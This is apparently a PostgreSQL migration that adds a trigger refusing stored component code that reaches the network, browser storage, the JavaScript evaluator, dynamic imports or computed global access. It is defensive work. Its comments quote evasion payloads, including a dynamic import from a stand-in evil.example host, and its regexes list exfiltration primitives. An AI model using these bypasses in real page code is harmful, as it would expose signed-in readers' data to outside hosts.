-- Q82 / B-17 — the DATABASE backstop for organization-authored component code.
--
-- THE HOLE (measured 2026-09-11). `content_ir.kind_component.component_source`
-- is arbitrary TSX that the browser compiles with `new Function` and runs
-- inside the signed-in page's own origin (matrx-frontend
-- features/agent-apps/utils/compile-slot.ts). Two write paths reached this
-- column and only one was gated:
--   * aidream's agent-tool path ran an import allowlist + an esbuild syntax
--     gate (matrx_ai/tools/implementations/kind_shared.py);
--   * the browser Studio path (features/content-ir/studio/
--     kind-component-code-service.ts) ran NOTHING;
--   * and NO trigger on this table had ever looked at the column — the eight
--     existing triggers stamp actors, touch timestamps, capture versions,
--     garbage-collect associations and demote the generic fallback.
-- So a component saved through the Studio could `fetch()` whatever the reader's
-- page could see, to any host, the moment anyone rendered the Shape.
--
-- THE CLASS FIX, of which this file is the third of three halves:
--   1. ONE rule in TypeScript (features/agent-apps/utils/component-source-gate.ts
--      over component-source-gate.json) called by the browser write path;
--   2. its Python twin in aidream kind_shared.py, held byte-identical to the
--      same JSON by packages/matrx-ai/tests/test_component_source_gate_parity.py;
--   3. THIS trigger, so a writer that reaches the table by any other route —
--      a script, an RPC, a future client — is refused too.
--
-- SCOPE OF THIS TRIGGER: the dangerous GLOBALS only, not the import allowlist.
-- The import allowlist is a RENDERING contract that moves with the frontend
-- bundle (a module added to ALLOWED_IMPORTS_CONFIG is usable the moment that
-- build ships); pinning it in the database would mean every frontend release
-- that widens the list must land a migration FIRST or legitimate saves start
-- failing. The globals list is a security invariant that does not move with a
-- build, so it belongs here. Both code paths still enforce both lists.
--
-- NO ROLE EXEMPTION, deliberately. The service role is not trusted more than a
-- browser here: aidream runs the identical twin before it writes, so a
-- service-role write this trigger refuses is one the Python gate would have
-- refused anyway. A `flavor = 'html'` body is exempt because it never reaches
-- the in-page compiler — it renders in KindHtmlFrame's iframe, which carries
-- `sandbox="allow-scripts allow-forms"` and NO `allow-same-origin`, so it holds
-- no session and no same-origin reach.
--
-- PROVEN SAFE ON LIVE DATA before applying: all 162 non-empty
-- `component_source` bodies in the table on 2026-09-11 pass every pattern below
-- (zero hits). The two bodies that touch browser storage do it as
-- `window.localStorage` (research_report_card,
-- agent_mandate_specification_workbench) and stay legal — storage is not an
-- exfiltration channel and banning it is a product ruling nobody has made.
--
-- DD-124 (2026-09-11). V-17 measured three bodies this trigger ACCEPTED that it
-- must not: `import("https://evil.example/x.js")` (a live module loader — only
-- the TypeScript gate refused it; the aidream twin accepted it too, measured
-- directly, so V-17's "both code paths refuse it" was half right),
-- `(()=>{}).constructor("return 1")` (the Function evaluator without naming
-- Function), and `window["fet"+"ch"]` (which NO string rule can catch, because
-- the banned name never appears in the source — so bracket access on the three
-- global roots is refused outright instead). All three are added below, in the
-- same shared JSON the two code paths read
-- (matrx-frontend features/agent-apps/utils/component-source-gate.json).
--
-- WHY THE PARITY MARKERS. This function cannot read that JSON at runtime, so
-- the three enforcement points could drift silently. Each pattern below carries
-- a `-- PARITY: <listName>` marker, and
-- features/agent-apps/utils/component-source-gate-trigger-parity.test.ts parses
-- THIS FILE and fails the moment the JSON names something the patterns do not.
-- That test is the third leg of the parity — treat the markers as load-bearing.
--
-- PROVEN SAFE ON LIVE DATA (DD-124, 2026-09-11): a read-only scan of all 162
-- non-empty bodies found ZERO hits for dynamic import(), ZERO for `.constructor(`
-- (and zero for `.constructor` in any form), and ZERO for bracket access on
-- window/globalThis/self. These three rules ban nothing that works today.
--
-- Idempotent: CREATE OR REPLACE + DROP/CREATE TRIGGER.

create or replace function content_ir.kind_component_source_gate()
returns trigger
language plpgsql
set search_path to ''
as $function$
declare
    v_source text := new.component_source;
    v_offender text;
    v_kind text;          -- which rule fired, so the sentence names the real problem
begin
    if v_source is null or btrim(v_source) = '' then
        return new;
    end if;

    -- Only inspect a body that is actually being written.
    if tg_op = 'UPDATE'
       and new.component_source is not distinct from old.component_source then
        return new;
    end if;

    -- Origin-isolated iframe flavor — not compiled in the page.
    if coalesce(new.config ->> 'flavor', '') = 'html' then
        return new;
    end if;

    -- 1. The banned globals as BARE identifiers (not preceded by a dot or a
    --    word character, so `AgentFunctionSpec` and `data.fetchedAt` are safe).
    -- PARITY: bannedGlobals
    v_offender := (regexp_match(
        v_source,
        '(?:^|[^.[:alnum:]_$])(EventSource|WebSocket|XMLHttpRequest|fetch|importScripts|localStorage|sessionStorage)(?:[^[:alnum:]_$]|$)'
    ))[1];

    -- 2. The evaluator, only where it is CALLED or CONSTRUCTED. The bare word
    --    `Function` is a legal TypeScript type annotation and appears in live
    --    bodies, so the identifier itself is not banned.
    if v_offender is null then
        -- PARITY: bannedCallables
        v_offender := (regexp_match(
            v_source,
            '(?:^|[^.[:alnum:]_$])(Function|eval)[[:space:]]*\('
        ))[1];
    end if;

    -- 3. The same names reached as a PROPERTY — `window.fetch`,
    --    `globalThis.WebSocket`, `document.cookie`, `navigator.sendBeacon` —
    --    which is the obvious way around rule 1.
    if v_offender is null then
        -- PARITY: bannedMemberAccess
        v_offender := (regexp_match(
            v_source,
            '\.[[:space:]]*(EventSource|Function|WebSocket|XMLHttpRequest|cookie|eval|fetch|importScripts|sendBeacon)(?:[^[:alnum:]_$]|$)'
        ))[1];
    end if;

    -- 4. The evaluator reached as a CONSTRUCTOR on any value —
    --    `(()=>{}).constructor("return 1")` is `Function` without the word
    --    `Function`. Banned as a CALL only: reading `x.constructor.name` for a
    --    type label is honest code.
    if v_offender is null then
        -- PARITY: bannedMemberCalls
        v_kind := 'member_call';
        v_offender := (regexp_match(
            v_source,
            '\.[[:space:]]*(constructor)[[:space:]]*\('
        ))[1];
    end if;

    -- 5. Computed (bracket) access on the global roots. `window["fet"+"ch"]`
    --    never spells the banned name, so NO name rule can catch it; the root
    --    loses bracket access instead. Blunt on purpose — the real answer is
    --    an origin boundary, and this is what a string rule can do until then.
    if v_offender is null then
        -- PARITY: bannedComputedAccess
        v_kind := 'computed_access';
        v_offender := (regexp_match(
            v_source,
            '(?:^|[^[:alnum:]_$])(globalThis|self|window)[[:space:]]*\['
        ))[1];
    end if;

    -- 6. Dynamic `import()` — a live module loader for any URL. The in-page
    --    compiler has no loader, so an honest component never needs one.
    if v_offender is null then
        -- PARITY: bannedSyntax dynamicImport
        v_kind := 'dynamic_import';
        v_offender := (regexp_match(
            v_source,
            '(?:^|[^.[:alnum:]_$])(import)[[:space:]]*\('
        ))[1];
    end if;

    if v_offender is null then
        v_kind := null;
    end if;

    if v_kind = 'member_call' then
        raise exception
            'This component calls ".%(", which components stored in the database may not use. Calling a value''s constructor reaches the JavaScript evaluator, so it could run code nobody reviewed inside the signed-in page. (component "%", kind component %)',
            v_offender, new.component_key, coalesce(new.id::text, 'new')
            using errcode = '22023',
                  hint = 'Write the logic out directly instead of building it as a string.';
    elsif v_kind = 'computed_access' then
        raise exception
            'This component uses "%[", which components stored in the database may not use. Looking a property up by a computed name hides which browser capability the component reaches, so no review can tell whether it is safe. (component "%", kind component %)',
            v_offender, new.component_key, coalesce(new.id::text, 'new')
            using errcode = '22023',
                  hint = 'Name what you need directly, and use props.data plus a Shape action for anything the component needs from the server.';
    elsif v_kind = 'dynamic_import' then
        raise exception
            'This component uses a dynamic import(), which components stored in the database may not use. The in-page compiler has no module loader, so the call would either fail at render or reach code nobody vetted. (component "%", kind component %)',
            new.component_key, coalesce(new.id::text, 'new')
            using errcode = '22023',
                  hint = 'Import from the allowlist at the top of the file instead.';
    elsif v_offender is not null then
        raise exception
            'This component uses "%", which components stored in the database may not use. They run inside the signed-in page, so anything that reaches the network or the JavaScript evaluator could read or send the reader''s data. (component "%", kind component %)',
            v_offender, new.component_key, coalesce(new.id::text, 'new')
            using errcode = '22023',
                  hint = 'Render what the Shape hands you in props.data, and use a Shape action for anything the component needs from the server.';
    end if;

    return new;
end;
$function$;

comment on function content_ir.kind_component_source_gate() is
    'Q82/B-17/DD-124 backstop: refuses a kind component body that reaches the network, browser storage, the JavaScript evaluator (named, or via .constructor()), a dynamic import(), or a computed property on window/globalThis/self. Twin rules live in matrx-frontend features/agent-apps/utils/component-source-gate.ts and aidream matrx_ai/tools/implementations/kind_shared.py, over the shared component-source-gate.json; component-source-gate-trigger-parity.test.ts proves this function names every entry of it.';

drop trigger if exists zzz_component_source_gate on content_ir.kind_component;

-- `zzz_` so it runs AFTER the stamping triggers, matching the convention the
-- table's other business-rule triggers already use.
create trigger zzz_component_source_gate
    before insert or update of component_source
    on content_ir.kind_component
    for each row
    execute function content_ir.kind_component_source_gate();
